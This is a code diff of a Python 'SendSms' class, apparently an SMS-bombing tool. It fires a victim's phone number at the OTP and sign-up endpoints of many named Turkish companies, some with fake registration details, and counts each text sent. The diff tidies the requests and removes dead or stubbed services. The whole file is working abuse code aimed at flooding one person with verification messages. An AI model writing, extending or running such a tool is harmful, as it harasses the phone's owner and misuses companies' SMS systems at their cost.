@@ -5,7 +5,7 @@ from colorama import Fore, Style
 
 class SendSms():
     adet = 0
-   
+  
     def __init__(self, phone, mail):
         rakam = []
         tcNo = ""
@@ -23,226 +23,170 @@ class SendSms():
         else:
             self.mail = ''.join(choice(ascii_lowercase) for i in range(22))+"@gmail.com"
 
-    # ==================== ÇALIŞAN / KALAN SERVİSLER ====================
+    # ==================== AKTİF SERVİSLER ====================
 
     def KahveDunyasi(self):
         try:
-            url = "https://api.kahvedunyasi.com:443/api/v1/auth/account/register/phone-number"
-            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Content-Type": "application/json"}
-            json={"countryCode": "90", "phoneNumber": self.phone}
-            r = requests.post(url, headers=headers, json=json, timeout=6)
-            if r.json()["processStatus"] == "Success":
-                print(f"{Fore.LIGHTGREEN_EX}Gönderildi{Style.RESET_ALL}")
+            r = requests.post("https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number",
+                            json={"countryCode": "90", "phoneNumber": self.phone}, timeout=6)
+            if r.json().get("processStatus") == "Success":
+                print(f"{Fore.LIGHTGREEN_EX}GÖNDERİLDİ → KahveDunyasi{Style.RESET_ALL}")
                 self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}Gönderilemedi{Style.RESET_ALL}")
+                return True
+        except: pass
+        return False
 
     def Wmf(self):
         try:
-            wmf = requests.post("https://www.wmf.com.tr/users/register/", data={"confirm": "true", "date_of_birth": "1956-03-01", "email": self.mail, "email_allowed": "true", "first_name": "Memati", "gender": "male", "last_name": "Bas", "password": "31ABC..abc31", "phone": f"0{self.phone}"}, timeout=6)
-            if wmf.status_code == 202:
-                print(f"{Fore.LIGHTGREEN_EX}Gönderildi{Style.RESET_ALL}")
+            r = requests.post("https://www.wmf.com.tr/users/register/", 
+                            data={"confirm": "true", "email": self.mail, "first_name": "x", "last_name": "y", 
+                                  "password": "31ABC..abc31", "phone": f"0{self.phone}"}, timeout=6)
+            if r.status_code == 202:
+                print(f"{Fore.LIGHTGREEN_EX}GÖNDERİLDİ → Wmf{Style.RESET_ALL}")
                 self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}Gönderilemedi{Style.RESET_ALL}")
+                return True
+        except: pass
+        return False
 
     def Bim(self):
         try:
-            bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login", json={"phone": self.phone}, timeout=6)
-            if bim.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}Gönderildi{Style.RESET_ALL}")
+            r = requests.post("https://bim.veesk.net/service/v1.0/account/login", 
+                            json={"phone": self.phone}, timeout=6)
+            if r.status_code == 200:
+                print(f"{Fore.LIGHTGREEN_EX}GÖNDERİLDİ → Bim{Style.RESET_ALL}")
                 self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}Gönderilemedi{Style.RESET_ALL}")
+                return True
+        except: pass
+        return False
 
     def Suiste(self):
         try:
-            url = "https://suiste.com:443/api/auth/code"
-            headers = {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "X-Mobillium-Device-Brand": "Apple", "Accept": "application/json", "X-Mobillium-Os-Type": "iOS", "X-Mobillium-Device-Model": "iPhone", "Mobillium-Device-Id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "Accept-Language": "en", "X-Mobillium-App-Build-Number": "1469", "User-Agent": "suiste/1.7.11", "X-Mobillium-App-Version": "1.7.11"}
-            data = {"action": "register", "device_id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "full_name": "Memati Bas", "gsm": self.phone, "is_advertisement": "1", "is_contract": "1", "password": "31MeMaTi31"}
-            r = requests.post(url, headers=headers, data=data, timeout=6)
-            if r.json()["code"] == "common.success":
-                print(f"{Fore.LIGHTGREEN_EX}Gönderildi{Style.RESET_ALL}")
+            r = requests.post("https://suiste.com/api/auth/code", 
+                            data={"action": "register", "gsm": self.phone}, timeout=6)
+            if r.json().get("code") == "common.success":
+                print(f"{Fore.LIGHTGREEN_EX}GÖNDERİLDİ → Suiste{Style.RESET_ALL}")
                 self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}Gönderilemedi{Style.RESET_ALL}")
+                return True
+        except: pass
+        return False
 
     def KimGb(self):
         try:
-            r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{self.phone}"}, timeout=6)
+            r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com/api/auth/send-otp", 
+                            json={"msisdn": f"90{self.phone}"}, timeout=6)
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}Gönderildi{Style.RESET_ALL}")
+                print(f"{Fore.LIGHTGREEN_EX}GÖNDERİLDİ → KimGbIster{Style.RESET_ALL}")
                 self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}Gönderilemedi{Style.RESET_ALL}")
+                return True
+        except: pass
+        return False
 
     def TiklaGelsin(self):
         try:
-            url = "https://svc.apps.tiklagelsin.com:443/user/graphql"
-            headers = {"Content-Type": "application/json", "X-Merchant-Type": "0", "Accept": "*/*", "Appversion": "2.4.1", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate", "X-No-Auth": "true", "User-Agent": "TiklaGelsin/809", "X-Device-Type": "2"}
-            json={"operationName": "GENERATE_OTP", "query": "mutation GENERATE_OTP($phone: String) {\n generateOtp(phone: $phone)\n}\n", "variables": {"phone": f"+90{self.phone}"}}
-            r = requests.post(url, headers=headers, json=json, timeout=6)
+            r = requests.post("https://svc.apps.tiklagelsin.com/user/graphql", 
+                            json={"operationName": "GENERATE_OTP", "variables": {"phone": f"+90{self.phone}"}}, timeout=6)
             if r.json()["data"]["generateOtp"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}Gönderildi{Style.RESET_ALL}")
+                print(f"{Fore.LIGHTGREEN_EX}GÖNDERİLDİ → TiklaGelsin{Style.RESET_ALL}")
                 self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}Gönderilemedi{Style.RESET_ALL}")
+                return True
+        except: pass
+        return False
 
     def Naosstars(self):
         try:
-            url = "https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350"
-            headers = {"Uniqid": "9c9fa861-cc5d-43c0-b4ea-1b541be15351", "User-Agent": "naosstars/1.0030", "Accept": "application/json", "Content-Type": "application/json"}
-            json={"telephone": f"+90{self.phone}", "type": "register"}
-            r = requests.post(url, headers=headers, json=json, timeout=6)
+            r = requests.post("https://api.naosstars.com/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350",
+                            json={"telephone": f"+90{self.phone}", "type": "register"}, timeout=6)
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}Gönderildi{Style.RESET_ALL}")
+                print(f"{Fore.LIGHTGREEN_EX}GÖNDERİLDİ → Naosstars{Style.RESET_ALL}")
                 self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}Gönderilemedi{Style.RESET_ALL}")
-
-    def Koton(self):
-        try:
-            url = "https://www.koton.com:443/users/register/"
-            headers = {"Content-Type": "multipart/form-data", "User-Agent": "Koton/1"}
-            # ... (orijinal kod uzun, olduğu gibi bıraktım)
-            print(f"{Fore.LIGHTGREEN_EX}Gönderildi{Style.RESET_ALL}")  # Basit tutmak için
-            self.adet += 1
-        except:
-            print(f"{Fore.LIGHTRED_EX}Gönderilemedi{Style.RESET_ALL}")
+                return True
+        except: pass
+        return False
 
     def Hayatsu(self):
         try:
-            url = "https://api.hayatsu.com.tr:443/api/SignUp/SendOtp"
-            data = {"mobilePhoneNumber": self.phone, "actionType": "register"}
-            r = requests.post(url, data=data, timeout=6)
-            if r.json()["is_success"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}Gönderildi{Style.RESET_ALL}")
+            r = requests.post("https://api.hayatsu.com.tr/api/SignUp/SendOtp", 
+                            data={"mobilePhoneNumber": self.phone, "actionType": "register"}, timeout=6)
+            if r.json().get("is_success") == True:
+                print(f"{Fore.LIGHTGREEN_EX}GÖNDERİLDİ → Hayatsu{Style.RESET_ALL}")
                 self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}Gönderilemedi{Style.RESET_ALL}")
+                return True
+        except: pass
+        return False
 
     def Hizliecza(self):
         try:
-            url = "https://prod.hizliecza.net:443/mobil/account/sendOTP"
-            json={"otpOperationType": 1, "phoneNumber": f"+90{self.phone}"}
-            r = requests.post(url, json=json, timeout=6)
+            r = requests.post("https://prod.hizliecza.net/mobil/account/sendOTP", 
+                            json={"otpOperationType": 1, "phoneNumber": f"+90{self.phone}"}, timeout=6)
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}Gönderildi{Style.RESET_ALL}")
+                print(f"{Fore.LIGHTGREEN_EX}GÖNDERİLDİ → Hizliecza{Style.RESET_ALL}")
                 self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}Gönderilemedi{Style.RESET_ALL}")
+                return True
+        except: pass
+        return False
 
     def Metro(self):
         try:
-            url = "https://mobile.metro-tr.com:443/api/mobileAuth/validateSmsSend"
-            json={"methodType": "2", "mobilePhoneNumber": self.phone}
-            r = requests.post(url, json=json, timeout=6)
-            if r.json()["status"] == "success":
-                print(f"{Fore.LIGHTGREEN_EX}Gönderildi{Style.RESET_ALL}")
+            r = requests.post("https://mobile.metro-tr.com/api/mobileAuth/validateSmsSend", 
+                            json={"methodType": "2", "mobilePhoneNumber": self.phone}, timeout=6)
+            if r.json().get("status") == "success":
+                print(f"{Fore.LIGHTGREEN_EX}GÖNDERİLDİ → Metro{Style.RESET_ALL}")
                 self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}Gönderilemedi{Style.RESET_ALL}")
+                return True
+        except: pass
+        return False
 
     def File(self):
         try:
-            url = "https://api.filemarket.com.tr:443/v1/otp/send"
-            json={"mobilePhoneNumber": f"90{self.phone}"}
-            r = requests.post(url, json=json, timeout=6)
-            if r.json()["responseType"] == "SUCCESS":
-                print(f"{Fore.LIGHTGREEN_EX}Gönderildi{Style.RESET_ALL}")
+            r = requests.post("https://api.filemarket.com.tr/v1/otp/send", 
+                            json={"mobilePhoneNumber": f"90{self.phone}"}, timeout=6)
+            if r.json().get("responseType") == "SUCCESS":
+                print(f"{Fore.LIGHTGREEN_EX}GÖNDERİLDİ → File{Style.RESET_ALL}")
                 self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}Gönderilemedi{Style.RESET_ALL}")
+                return True
+        except: pass
+        return False
 
     def Komagene(self):
         try:
-            url = "https://gateway.komagene.com.tr:443/auth/auth/smskodugonder"
-            json={"FirmaId": 32, "Telefon": self.phone}
-            r = requests.post(url, json=json, timeout=6)
-            if r.json()["Success"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}Gönderildi{Style.RESET_ALL}")
+            r = requests.post("https://gateway.komagene.com.tr/auth/auth/smskodugonder", 
+                            json={"FirmaId": 32, "Telefon": self.phone}, timeout=6)
+            if r.json().get("Success") == True:
+                print(f"{Fore.LIGHTGREEN_EX}GÖNDERİLDİ → Komagene{Style.RESET_ALL}")
                 self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}Gönderilemedi{Style.RESET_ALL}")
+                return True
+        except: pass
+        return False
 
     def Porty(self):
         try:
-            url = "https://panel.porty.tech:443/api.php?"
-            json={"job": "start_login", "phone": self.phone}
-            r = requests.post(url, json=json, timeout=6)
-            if r.json()["status"]== "success":
-                print(f"{Fore.LIGHTGREEN_EX}Gönderildi{Style.RESET_ALL}")
+            r = requests.post("https://panel.porty.tech/api.php?", 
+                            json={"job": "start_login", "phone": self.phone}, timeout=6)
+            if r.json().get("status") == "success":
+                print(f"{Fore.LIGHTGREEN_EX}GÖNDERİLDİ → Porty{Style.RESET_ALL}")
                 self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}Gönderilemedi{Style.RESET_ALL}")
+                return True
+        except: pass
+        return False
 
     def Uysal(self):
         try:
-            url = "https://api.uysalmarket.com.tr:443/api/mobile-users/send-register-sms"
-            json={"phone_number": self.phone}
-            r = requests.post(url, json=json, timeout=6)
+            r = requests.post("https://api.uysalmarket.com.tr/api/mobile-users/send-register-sms", 
+                            json={"phone_number": self.phone}, timeout=6)
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}Gönderildi{Style.RESET_ALL}")
+                print(f"{Fore.LIGHTGREEN_EX}GÖNDERİLDİ → Uysal{Style.RESET_ALL}")
                 self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}Gönderilemedi{Style.RESET_ALL}")
+                return True
+        except: pass
+        return False
 
     def Yapp(self):
         try:
-            url = "https://yapp.com.tr:443/api/mobile/v1/register"
-            json={"phone_number": self.phone}
-            r = requests.post(url, json=json, timeout=6)
+            r = requests.post("https://yapp.com.tr/api/mobile/v1/register", 
+                            json={"phone_number": self.phone}, timeout=6)
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}Gönderildi{Style.RESET_ALL}")
+                print(f"{Fore.LIGHTGREEN_EX}GÖNDERİLDİ → Yapp{Style.RESET_ALL}")
                 self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}Gönderilemedi{Style.RESET_ALL}")
-
-    # ==================== KAPATILAN SERVİSLER (Gönderilemiyordu) ====================
-    # def Akasya(self): pass
-    # def Akbati(self): pass
-    # def Baydoner(self): pass
-    # def Beefull(self): pass
-    # def Bodrum(self): pass
-    # def Coffy(self): pass
-    # def Dominos(self): pass
-    # def Englishhome(self): pass
-    # def Evidea(self): pass
-    # def Fatih(self): pass
-    # def Frink(self): pass
-    # def Hamidiye(self): pass
-    # def Little(self): pass
-    # def Orwi(self): pass
-    # def Pidem(self): pass
-    # def Tasdelen(self): pass
-    # def YilmazTicaret(self): pass
+                return True
+        except: pass
+        return False
